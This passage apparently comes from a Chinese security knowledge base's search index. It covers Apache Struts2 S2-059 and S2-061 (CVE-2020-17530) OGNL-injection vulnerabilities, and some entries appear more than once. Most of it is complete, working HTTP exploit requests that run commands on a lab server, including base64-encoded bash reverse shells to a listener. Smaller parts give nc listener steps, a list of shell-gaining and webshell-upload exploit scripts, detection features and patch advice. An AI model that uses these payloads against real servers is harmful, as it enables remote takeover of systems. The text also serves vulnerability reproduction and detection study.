``\"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}'))}\"``}``res1 ``=` `requests.post(url, data``=``data1)``res2 ``=` `requests.post(url, data``=``data2) 1.\u76d1\u542c\u7aef\u53e3 nc -lvvp 6666 2.\u8fd0\u884c\u811a\u672c python3 payload.py 3.\u53cd\u5f39shell","title":"\uff081\uff09\u6f0f\u6d1e\u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_5","text":"\u653b\u51fb\u7684\u65f6\u5019\u6293\u53d6\u6570\u636e\u5305","title":"\u4e94\u3001\u6f0f\u6d1e\u5206\u6790"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_6","text":"\u4ece\u653b\u51fb\u6570\u636e\u5305\u91cc\u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u5230\uff0c\u653b\u51fb\u8005\u901a\u8fc7id\u503c=xxx\uff0c\u6765\u4f20\u5165\u6076\u610f\u7684payload\uff0c \u5176\u4e2d %25\u662f % \uff0c%7B\u662f{\uff0c%7D\u662f} \u800c\u8bf7\u6c42\u5305\u4e2d\u5305\u542bpayload\uff0c\u4f8b\u5982suricata\u89c4\u5219\u4e2d\u53ef\u4ee5\u7528content\u6765\u5339\u914d\u3002 \u6211\u4eec\u8fd8\u662f\u5148\u5bf9\u53d1\u9001\u5305\u8fdb\u884cURL\u89e3\u7801: id``=%{(``#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))} \u8fd9\u6837\u5c31\u5f88\u6e05\u6670\u4e86\uff0c\u53ef\u4ee5\u5f97\u5230\u53cc\u5411\u89c4\u5219\uff0c\u6765\u9632\u62a4\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u653b\u51fb\u3002 \u7279\u5f81 \u8bf4\u660e POST\u65b9\u5f0f http.method=POST \u72b6\u6001\u7801 200 \u8bf7\u6c42\u5934 \u5305\u542b % \u8bf7\u6c42\u5934 \u5305\u542b { \u8bf7\u6c42\u5934 \u5305\u542b } \u8bf7\u6c42\u5934\u5305\u542bpayload \u54cd\u5e94\u5934\u5305\u542bpayload","title":"\u516d\u3001\u7279\u5f81\u63d0\u53d6"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/","text":"Struts2-061 \u00b6 0x00 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Apache Struts2\u6846\u67b6\u662f\u4e00\u4e2a\u7528\u4e8e\u5f00\u53d1Java EE\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u7684Web\u6846\u67b6\u3002Apache Struts\u4e8e2020\u5e7412\u670808\u65e5\u62ab\u9732 S2-061 Struts \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-17530)\uff0c\u5728\u4f7f\u7528\u67d0\u4e9btag\u7b49\u60c5\u51b5\u4e0b\u53ef\u80fd\u5b58\u5728OGNL\u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u98ce\u9669\u6781\u5927\u3002 0x01 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Struts2 \u4f1a\u5bf9\u67d0\u4e9b\u6807\u7b7e\u5c5e\u6027(\u6bd4\u5982 id \uff0c\u5176\u4ed6\u5c5e\u6027\u6709\u5f85\u5bfb\u627e) \u7684\u5c5e\u6027\u503c\u8fdb\u884c\u4e8c\u6b21\u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u56e0\u6b64\u5f53\u8fd9\u4e9b\u6807\u7b7e\u5c5e\u6027\u4e2d\u4f7f\u7528\u4e86 %{x} \u4e14 x \u7684\u503c\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u7528\u6237\u518d\u4f20\u5165\u4e00\u4e2a %{payload} \u5373\u53ef\u9020\u6210OGNL\u8868\u8fbe\u5f0f\u6267\u884c\u3002S2-061\u662f\u5bf9S2-059\u6c99\u76d2\u8fdb\u884c\u7684\u7ed5\u8fc7\u3002 0x02 \u6f0f\u6d1e\u5f71\u54cd \u00b6 struts 2.0.0 - struts 2.5.25 0x03 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4e00.\u73af\u5883\u642d\u5efa 1.docker\u73af\u5883\u5730\u5740\uff1a https://github.com/vulhub/vulhub/tree/master/struts2/s2-061 docker-compose up -d #\u542f\u52a8docker\u73af\u5883 2.\u8bbf\u95ee\u76ee\u6807\u5730\u5740 http://192.168.1.14:8080/index.action \u4e8c\u3001\u6f0f\u6d1e\u5229\u7528 1.DNSlog\u9a8c\u8bc1\u6f0f\u6d1e POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 853 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"ping paqmgs.dnslog.cn\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- DNGlog\u8bb0\u5f55\u53ef\u53d1\u73b0\u547d\u4ee4\u6210\u529f\u6267\u884c 2.\u901a\u8fc7\u6784\u9020post\u5305\u6267\u884cexp \u547d\u4ee4\u6267\u884cid POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 827 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- burp\u63d0\u4ea4\u540e\uff0c\u5728\u54cd\u5e94\u9875\u9762\u53d1\u73b0\u547d\u4ee4\u56de\u663e\u53ef\uff0c\u8bf4\u660eID\u547d\u4ee4\u6267\u884c\u6210\u529f \u6216\u8005 POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 1361 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{ (#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'})) } ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- 3.\u53cd\u5f39shell\u547d\u4ee4 \u901a\u8fc7\u4ee5\u4e0b\u5728\u7ebf\u5730\u5740\u5c06bash\u53cd\u5f39\u547d\u4ee4\u8fdb\u884c\u8fdb\u884c\u7f16\u7801\u8f6c\u6362 http://www.jackson-t.ca/runtime-exec-payloads.html \u63d0\u4ea4\u4ee5\u4e0bpoc: POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 922 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- \u53ef\u4ee5\u770b\u5230\u6210\u529f\u53cd\u5f39shell: 0x04 \u6f0f\u6d1e\u4fee\u590d \u00b6 \u907f\u514d\u5bf9\u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5f3a\u5236OGNL\u8bc4\u4f30\uff0c\u6216/\u548c\u5347\u7ea7\u52302.5.26\u7248\uff0c\u53ef\u4fee\u590d\u8be5\u6f0f\u6d1e\u3002\u817e\u8baf\u5b89\u5168\u4e13\u5bb6\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c06Apache Struts\u6846\u67b6\u5347\u7ea7\u81f3\u6700\u65b0\u7248\u672c \u4e34\u65f6\u4fee\u590d\uff0c\u5347\u7ea7\u5230 Struts 2.5.26 \u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26 0x05 \u6f0f\u6d1e\u603b\u7ed3 \u00b6 \u6b64\u6b21\u6f0f\u6d1e\u53ea\u662fS2-059\u4fee\u590d\u7684\u4e00\u4e2a\u7ed5\u8fc7\uff0c\u5e76\u4e14\u672c\u6b21\u5229\u7528\u7684\u6838\u5fc3\u7c7borg.apache.commons.collections.BeanMap\u5728commons-collections-x.x.jar\u5305\u4e2d\uff0c\u4f46\u662f\u5728\u5b98\u65b9\u7684\u6700\u5c0f\u4f9d\u8d56\u5305\u4e2d\u5e76\u6ca1\u6709\u5305\u542b\u8fd9\u4e2a\u5305\u3002\u6240\u4ee5\u5373\u4f7f\u626b\u5230\u4e86\u652f\u6301OGNL\u8868\u8fbe\u5f0f\u7684\u6ce8\u5165\u70b9\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a\u4f9d\u8d56\u5305\uff0c\u4e5f\u8fd8\u662f\u6ca1\u529e\u6cd5\u8fdb\u884c\u5229\u7528\u3002 \u6765\u6e90\u7f51\u7edc https://www.cnblogs.com/backlion/p/14122528.html","title":"Struts2 061"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#struts2-061","text":"","title":"Struts2-061"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x00","text":"Apache Struts2\u6846\u67b6\u662f\u4e00\u4e2a\u7528\u4e8e\u5f00\u53d1Java EE\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u7684Web\u6846\u67b6\u3002Apache Struts\u4e8e2020\u5e7412\u670808\u65e5\u62ab\u9732 S2-061 Struts \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-17530)\uff0c\u5728\u4f7f\u7528\u67d0\u4e9btag\u7b49\u60c5\u51b5\u4e0b\u53ef\u80fd\u5b58\u5728OGNL\u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u98ce\u9669\u6781\u5927\u3002","title":"0x00 \u6f0f\u6d1e\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x01","text":"Struts2 \u4f1a\u5bf9\u67d0\u4e9b\u6807\u7b7e\u5c5e\u6027(\u6bd4\u5982 id \uff0c\u5176\u4ed6\u5c5e\u6027\u6709\u5f85\u5bfb\u627e) \u7684\u5c5e\u6027\u503c\u8fdb\u884c\u4e8c\u6b21\u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u56e0\u6b64\u5f53\u8fd9\u4e9b\u6807\u7b7e\u5c5e\u6027\u4e2d\u4f7f\u7528\u4e86 %{x} \u4e14 x \u7684\u503c\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u7528\u6237\u518d\u4f20\u5165\u4e00\u4e2a %{payload} \u5373\u53ef\u9020\u6210OGNL\u8868\u8fbe\u5f0f\u6267\u884c\u3002S2-061\u662f\u5bf9S2-059\u6c99\u76d2\u8fdb\u884c\u7684\u7ed5\u8fc7\u3002","title":"0x01 \u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x02","text":"struts 2.0.0 - struts 2.5.25","title":"0x02 \u6f0f\u6d1e\u5f71\u54cd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x03","text":"\u4e00.\u73af\u5883\u642d\u5efa 1.docker\u73af\u5883\u5730\u5740\uff1a https://github.com/vulhub/vulhub/tree/master/struts2/s2-061 docker-compose up -d #\u542f\u52a8docker\u73af\u5883 2.\u8bbf\u95ee\u76ee\u6807\u5730\u5740 http://192.168.1.14:8080/index.action \u4e8c\u3001\u6f0f\u6d1e\u5229\u7528 1.DNSlog\u9a8c\u8bc1\u6f0f\u6d1e POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 853 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"ping paqmgs.dnslog.cn\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- DNGlog\u8bb0\u5f55\u53ef\u53d1\u73b0\u547d\u4ee4\u6210\u529f\u6267\u884c 2.\u901a\u8fc7\u6784\u9020post\u5305\u6267\u884cexp \u547d\u4ee4\u6267\u884cid POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 827 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- burp\u63d0\u4ea4\u540e\uff0c\u5728\u54cd\u5e94\u9875\u9762\u53d1\u73b0\u547d\u4ee4\u56de\u663e\u53ef\uff0c\u8bf4\u660eID\u547d\u4ee4\u6267\u884c\u6210\u529f \u6216\u8005 POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 1361 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{ (#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'})) } ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- 3.\u53cd\u5f39shell\u547d\u4ee4 \u901a\u8fc7\u4ee5\u4e0b\u5728\u7ebf\u5730\u5740\u5c06bash\u53cd\u5f39\u547d\u4ee4\u8fdb\u884c\u8fdb\u884c\u7f16\u7801\u8f6c\u6362 http://www.jackson-t.ca/runtime-exec-payloads.html \u63d0\u4ea4\u4ee5\u4e0bpoc: POST /index.action HTTP/1.1 Host: 192.168.1.14:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 922 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- \u53ef\u4ee5\u770b\u5230\u6210\u529f\u53cd\u5f39shell:","title":"0x03 \u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x04","text":"\u907f\u514d\u5bf9\u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5f3a\u5236OGNL\u8bc4\u4f30\uff0c\u6216/\u548c\u5347\u7ea7\u52302.5.26\u7248\uff0c\u53ef\u4fee\u590d\u8be5\u6f0f\u6d1e\u3002\u817e\u8baf\u5b89\u5168\u4e13\u5bb6\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c06Apache Struts\u6846\u67b6\u5347\u7ea7\u81f3\u6700\u65b0\u7248\u672c \u4e34\u65f6\u4fee\u590d\uff0c\u5347\u7ea7\u5230 Struts 2.5.26 \u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26","title":"0x04 \u6f0f\u6d1e\u4fee\u590d"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x05","text":"\u6b64\u6b21\u6f0f\u6d1e\u53ea\u662fS2-059\u4fee\u590d\u7684\u4e00\u4e2a\u7ed5\u8fc7\uff0c\u5e76\u4e14\u672c\u6b21\u5229\u7528\u7684\u6838\u5fc3\u7c7borg.apache.commons.collections.BeanMap\u5728commons-collections-x.x.jar\u5305\u4e2d\uff0c\u4f46\u662f\u5728\u5b98\u65b9\u7684\u6700\u5c0f\u4f9d\u8d56\u5305\u4e2d\u5e76\u6ca1\u6709\u5305\u542b\u8fd9\u4e2a\u5305\u3002\u6240\u4ee5\u5373\u4f7f\u626b\u5230\u4e86\u652f\u6301OGNL\u8868\u8fbe\u5f0f\u7684\u6ce8\u5165\u70b9\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a\u4f9d\u8d56\u5305\uff0c\u4e5f\u8fd8\u662f\u6ca1\u529e\u6cd5\u8fdb\u884c\u5229\u7528\u3002 \u6765\u6e90\u7f51\u7edc https://www.cnblogs.com/backlion/p/14122528.html","title":"0x05 \u6f0f\u6d1e\u603b\u7ed3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/","text":"About Apache Struts2 \u00b6 xxxxx Vulnerability list \u00b6 struts2-032_cmd.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eGetShell\u5229\u7528\u811a\u672c(CVE-2016-3081) struts2-032_poc.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c(CVE-2016-3081) struts2-045_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c1(CVE-2017-5638) [\u4f7f\u7528] struts2-045-2_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c2(CVE-2017-5638) [\u4f7f\u7528] struts2-052_cmd.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-9805) struts2-052_webshell.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c(CVE-2017-9805) struts2-053_cmd.py Struts2 Freemarker \u6807\u7b7e\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-12611) struts2-057_cmd.py Struts2 Namespace \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2018-11776) Readme \u00b6 \u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003 vulnerability-list \u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0","title":"About Apache Struts2"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/#about-apache-struts2","text":"xxxxx","title":"About Apache Struts2"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/#vulnerability-list","text":"struts2-032_cmd.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eGetShell\u5229\u7528\u811a\u672c(CVE-2016-3081) struts2-032_poc.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c(CVE-2016-3081) struts2-045_cmd.py Struts2 Jakarta Multipart parser 